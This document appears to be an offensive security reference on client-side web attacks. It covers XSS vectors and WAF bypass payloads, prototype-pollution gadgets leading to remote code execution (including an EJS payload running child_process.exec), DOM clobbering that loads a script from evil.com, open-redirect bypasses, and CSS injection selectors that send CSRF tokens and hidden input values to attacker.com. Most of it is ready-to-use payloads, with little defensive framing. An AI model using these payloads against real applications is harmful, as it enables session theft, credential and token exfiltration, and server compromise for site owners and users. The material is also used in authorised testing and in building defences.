# Client-Side Attacks Reference

## XSS (Cross-Site Scripting)

### Source Audit Targets
- Unescaped output in templates (raw/unfiltered rendering)
- DOM-based XSS via `innerHTML`, `document.write`, `eval()`, URL fragment, `location.*`, `document.referrer`, `window.name`, `postMessage`
- Stored XSS in names, titles, descriptions, comments, filenames, EXIF data, SVG uploads, imported data
- Reflected XSS in search, error messages, redirect parameters, 404 pages, JSON responses with wrong Content-Type
- CSP bypass vectors: `unsafe-inline`, `unsafe-eval`, `data:` URI, JSONP endpoints on whitelisted domains, `base-uri` missing (base tag injection), Angular/Vue template injection within CSP, CDN-hosted libraries with known gadgets, `object-src` to Flash/PDF, `script-src` with wildcard subdomains
- Mutation XSS (mXSS): browser HTML parser mutations turning safe markup into executable code (DOMPurify bypasses, namespace confusion)
- XSS in PDF generators (wkhtmltopdf, Puppeteer — `<script>`, `<iframe>`, SSRF+XSS), email templates (HTML injection), markdown renderers (link/image injection, HTML passthrough)
- Blind XSS: payload fires later in admin panel, logging dashboard, support ticket system, error monitoring tool
- XSS via SVG upload: `<svg onload="alert(1)">`, `<svg><script>alert(1)</script></svg>`
- XSS via content-type sniffing: missing `X-Content-Type-Options: nosniff` allows browser to interpret response as HTML
- XSS via service workers: registering a malicious service worker from XSS for persistence
- AngularJS sandbox escape (versions < 1.6): `{{constructor.constructor('alert(1)')()}}`
- Vue.js client-side template injection: `v-html` with user data, `{{constructor.constructor('alert(1)')()}}`
- React `dangerouslySetInnerHTML`, `href="javascript:..."` in user-controlled links
- XSS polyglots: payloads that work across multiple contexts (HTML, JS string, URL, attribute)
- DOM clobbering: using HTML elements (`<form id="x">`, `<img name="y">`) to overwrite DOM properties and escalate to XSS
- CSS injection (exfiltration via `background: url()` with attribute selectors, `@import`, `@font-face` with unicode-range)
- XSS in WebSocket message handlers
- XSS via `postMessage` without origin validation
- XSS in XML/SVG/MathML namespaces (namespace confusion bypasses sanitizers)
- JSON injection in `<script>` tags: breaking out of JSON assignment via `</script>`, `<!--`, line terminators (U+2028, U+2029)
- Header injection to XSS: CRLF injecting `Content-Type: text/html` or injecting body content

### Novel XSS Vectors (2024-2026)

**CSS-triggered execution (no user interaction):**
- `oncontentvisibilityautostatechange` — fires on elements with `content-visibility:auto`, no click needed
- `onanimationstart/end/cancel/iteration` — triggered by CSS `@keyframes`, cross-browser
- `ontransitionstart/end/run/cancel` — CSS transitions fire these on `:target` or class changes
- `onscrollsnapchange` / `onscrollsnapchanging` — fires at end of scroll on snap containers

**Popover & Dialog API abuse:**
- `onbeforetoggle` — fires before `popover` element toggles; just needs `<button popovertarget=x>`
- `oncommand` — fires when command sent via `commandfor`/`command` attributes (new HTML spec)
- `onclose` — dialog close event via `<form method=dialog>` inside `<dialog open>`

**Shadow DOM / Declarative Shadow Root:**
- `onslotchange` — fires when slot content changes inside `<template shadowrootmode=open>`, bypasses many sanitizers

**CSP ironic bypass:**
- `onsecuritypolicyviolation` — the CSP violation handler itself can execute JS
- `onunhandledrejection` — fires on unhandled Promise rejections

**Key insight:** Most events work on undefined/custom tags like `<xss>`, making tag-based WAF allowlists ineffective.

### WAF-Specific XSS Bypasses

| WAF | Bypass Payload |
|-----|---------------|
| **Akamai Kona** | `\');confirm(1);//` |
| **ModSecurity** | `<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain)>` |
| **Wordfence** | `<meter onmouseover="alert(1)"`, `><marquee loop=1 width=0 onfinish=alert(1)>` |
| **Incapsula** | `<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>`, `<img/src=q onerror='new Function\`al\\ert\\`1\\`\`'>` |

### XSS Polyglot (Universal Payload)
`jaVasCript:/*-/*\`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`

### Markdown XSS Vectors
- `[a](javascript:confirm(1))`, `[a](javascript://www.google.com%0Aprompt(1))`
- `[a](javascript://%0d%0aconfirm(1);com)`, `[a](javascript:window.onerror=confirm;throw%201)`
- RubyDoc: `XSS[JavaScript:alert(1)]`
- Textile: `"Test link":javascript:alert(1)`
- reStructuredText: `` `Test link`__ `` with `javascript:alert(document.domain)`

---

## Prototype Pollution (JavaScript)

### Server-Side (Node.js)
- Polluting `Object.prototype` via deep merge, recursive assign, `lodash.merge`/`lodash.set`/`lodash.defaultsDeep` (CVE-2018-16487), `jQuery.extend(true,...)`, `hoek.merge`, `destr`, `qs` library nested objects

### Client-Side
- URL parameter parsing (`?__proto__[isAdmin]=true`), JSON input with `__proto__`, `constructor.prototype`, or `constructor` keys

### Payloads
- `{"__proto__":{"isAdmin":true}}`
- `{"constructor":{"prototype":{"polluted":true}}}`
- `{"__proto__":{"shell":"/bin/bash","NODE_OPTIONS":"--require=/proc/self/environ"}}`

### Gadgets for RCE (Node.js)
- Pollute `shell`, `NODE_OPTIONS`, `env` properties used by `child_process.spawn/exec/fork`
- Pollute `mainModule` or `require` paths

### Gadgets for XSS (client)
- Pollute `innerHTML`, `src`, `href`, `srcdoc`, `data-*` attributes that frameworks read from prototype chain
- Pollute `transport_url` in Google Analytics
- Pollute `sourceURL` for eval-based gadgets

### Detection
- `({}).polluted` check, `Object.prototype.hasOwnProperty('polluted')`, Burp Suite DOM Invader

### Frameworks
- Express handlebars, EJS, Pug all have known prototype pollution to RCE gadgets

### Mitigation Bypass
- Even `Object.create(null)` can be bypassed if the pollution target is a different object in the chain

### Server-Side RCE Gadgets (Expanded)

**child_process gadgets:**

| Gadget | Polluted Properties | Impact |
|--------|-------------------|--------|
| **ENV + /proc/self/environ** | `NODE_OPTIONS`, `env` | `NODE_OPTIONS: "--require /proc/self/environ"` + env with JS code |
| **argv0 + /proc/self/cmdline** | `NODE_OPTIONS`, `argv0` | `NODE_OPTIONS: "--require /proc/self/cmdline"` + argv0 with JS |
| **data-URI import (Node >= 19)** | `NODE_OPTIONS` | `NODE_OPTIONS: "--import data:text/javascript;base64,..."` — no filesystem needed |
| **execArgv injection** | `execPath`, `execArgv`, `argv0` | `execPath: "/bin/sh"`, `execArgv: ["-c", "cmd"]` (fork only) |
| **stdin input injection** | `input` | `input: "commands\n"` (execSync/spawnSync) |
| **shell override** | `shell`, `argv0` | `shell: "/path/to/binary"` (exec/spawn) |

**Express.js / Middleware gadgets:**

| Gadget | Polluted Property | Impact |
|--------|------------------|--------|
| XSS via body overwrite | `_body`, `body` | Stored XSS (HTML served instead of JSON) |
| UTF-7 charset injection | `content-type` | Encoding bypass |
| Status code manipulation | `status` | Arbitrary HTTP status |
| CORS header injection | `exposedHeaders` | Header injection |
| Dot notation enabling | `allowDots` | Nested object creation from query strings |
| Parameter limits | `parameterLimit` | DoS or bypass |

**Blind detection payloads (non-destructive):**
- `"__proto__": {"json spaces": 10}` — detectable via JSON response formatting
- `"__proto__": {"exposedHeaders": ["x-"]}` — CORS header appears
- `"__proto__": {"status": 510}` — obscure status code returned
- DNS exfil: `"NODE_OPTIONS": "--inspect=id.oastify.com"` — OOB detection

### Client-Side Prototype Pollution Gadgets (50+)

| Library | Gadget | Impact |
|---------|--------|--------|
| **Vue.js** | `v-if`, `v-bind:class`, `template`, `attrs/is` | XSS via directive injection |
| **Knockout.js** | Array prototype pollution | XSS |
| **DOMPurify <= 2.0.12** | `ALLOWED_ATTR`, `documentMode` | Sanitizer bypass |
| **sanitize-html** | `*` wildcard, `innerText` | Sanitizer bypass |
| **js-xss** | `whiteList` pollution | Sanitizer bypass |
| **Google Closure** | `CLOSURE_BASE_PATH`, `trustedTypes/emptyHTML` | XSS |
| **i18next** | `nsSeparator`, `lng`, `key` | XSS |
| **Popper.js** | `arrow[ontransitionend]` | XSS via CSS transition event |
| **Pendo Agent** | `dataHost` | Remote script injection |
| **hCaptcha** | `assethost` | JavaScript protocol injection |
| **Google Tag Manager** | `vtp_enableRecaptcha/srcdoc`, `q` array | XSS |
| **Demandbase Tag** | `Config[SiteOptimization]` | Remote endpoint redirect |

### Kibana RCE (CVE-2019-7609)
Timelion label prototype → NODE_OPTIONS env var: `.es(*).props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ'...)`

### EJS Template Gadget → RCE
`{"__proto__": {"escapeFunction": "JSON.stringify; require('child_process').exec('id')"}}` — template injection to RCE

---

## CORS Misconfiguration

- `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` (browser blocks this, but misconfigured reflection doesn't)
- Origin reflection: server reflects `Origin` header directly in `Access-Control-Allow-Origin` — attacker origin gets access
- Null origin allowed: `Access-Control-Allow-Origin: null` — achievable via sandboxed iframe, data URI, `file://`
- Subdomain wildcard: `*.example.com` trusted — XSS on any subdomain escalates to cross-origin data access
- Pre-flight bypass: simple requests (GET/POST with certain content types) skip OPTIONS check
- Regex bypass in origin validation: `evil-example.com` matches regex for `example.com`, `example.com.evil.com`

---

## Open Redirect

- Redirect parameters: `?url=`, `?next=`, `?redirect=`, `?return=`, `?returnTo=`, `?goto=`, `?dest=`, `?continue=`, `?target=`
- Protocol-relative redirect: `//attacker.com` — browser interprets as `https://attacker.com`
- Bypass domain validation: `https://legit.com@attacker.com`, `https://attacker.com#legit.com`, `https://legit.com.attacker.com`, `https://attacker.com/legit.com`, `https://legit.com%40attacker.com`
- Backslash trick: `https://legit.com\@attacker.com` — some parsers treat `\` as path separator
- URL encoding bypass: `%2f%2fattacker.com`, `%09`, `%0d`, `%0a` breaking URL parsing
- Data URI redirect: `data:text/html,<script>...` (some frameworks follow data URIs)
- JavaScript URI: `javascript:alert(1)` in redirect destination (if used in `window.location`)
- Double/triple URL encoding
- Chaining: open redirect → OAuth token theft, open redirect → SSRF filter bypass, open redirect → phishing

---

## DOM Clobbering

### Core Mechanism
HTML elements with `id` or `name` attributes automatically create global variables on `window` and named properties on `document`. Elements supporting `name` clobbering: `embed`, `form`, `iframe`, `image`, `img`, `object`.

### Gadget Patterns

**Named access override:**
```html
<a id=someObject><a id=someObject name=url href=//evil.com/payload.js>
```
Multiple anchors with same `id` create a DOM collection. `name` becomes a property: `someObject.url` → attacker-controlled `href`.

**document property hijacking:**
```html
<img name=cookie /> <!-- document.cookie now returns HTMLImageElement -->
```

**Form hijacking:**
```html
<textarea form="id-other-form" name="info">attacker-data</textarea>
<button form="id-other-form" type="submit" formaction="/edit"></button>
```

### Nested Property Clobbering
- **Two-level (a.b):** `<a id="x"><a id="x" name="y" href="controlled">` → `x.y` returns href
- **Three-level (a.b.c):** `<form id="x" name="y"><input id="z" value="controlled"/>` → `x.y.z.value`
- **Deep nesting via iframes:** multiple nested iframes with HTML-encoded content for `a.b.c.d.e`

### Sanitizer Bypasses

**DOMPurify `cid:` protocol bypass:**
```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```
`cid:` protocol avoids URL-encoding of double quotes. At runtime, browser decodes entity, breaking out of attribute context.

**Form `attributes` property clobbering:**
```html
<form onclick=alert(1)><input id=attributes>Click me</form>
```
Sanitizers expect `.attributes` to be `NamedNodeMap`. Clobbering with `<input>` causes enumeration to fail silently — malicious attributes never removed.

**SVG context clobbering:** `<body>` within `<svg>` and `<html>` within `<svg><foreignobject>` bypass sanitizers that only handle HTML namespaces.

### toString/valueOf Exploitation
- Anchor elements return their `href` when coerced to string — attackers control string value
- Form elements return `[object HTMLFormElement]` — useful for type-check bypasses

---

## CSS Injection Exfiltration

### Attribute Selector Extraction
```css
input[value^="a"] { background: url(https://attacker.com/leak?char=a); }
```
Character-by-character leaking via prefix matching. Each matching selector triggers HTTP request.

**Hidden element bypass via sibling combinator:**
```css
input[type=hidden][value^="token"] ~ * { background: url(https://attacker.com/leak?v=token); }
```

### `:has()` Selector Abuse (Modern Browsers)
```css
form:has(input[name="csrf"][value^="abc"]) { background: url(https://attacker.com/?prefix=abc); }
```
Checks child element attributes from parent. Works on hidden inputs without knowing page structure.

### @import Recursive Chain
Server delays each `@import` response until previous character confirmed. Creates a blocking chain automating sequential extraction from single injection point.

### Font-Face Unicode-Range Method
```css
@font-face { font-family: probe; src: url(https://attacker.com/leak?char=A); unicode-range: U+0041; }
```
Browser only fetches font if target contains matching characters.

### Ligature-Based Text Node Extraction
1. Custom SVG fonts where specific character sequences (ligatures) have extreme widths
2. Matching sequence changes element width → horizontal scrollbar appears
3. Scrollbar triggers `body::-webkit-scrollbar` styling → background-image request
4. Extracts **text content** (not just attributes) — works on CSRF tokens rendered as text

### CSP Bypass Considerations
- CSS injection not blocked by `script-src` CSP — operates within style contexts
- `style-src 'unsafe-inline'` (extremely common) enables inline injection
- `:has()` technique works entirely within existing page styles
- No JavaScript execution needed for any CSS exfiltration technique
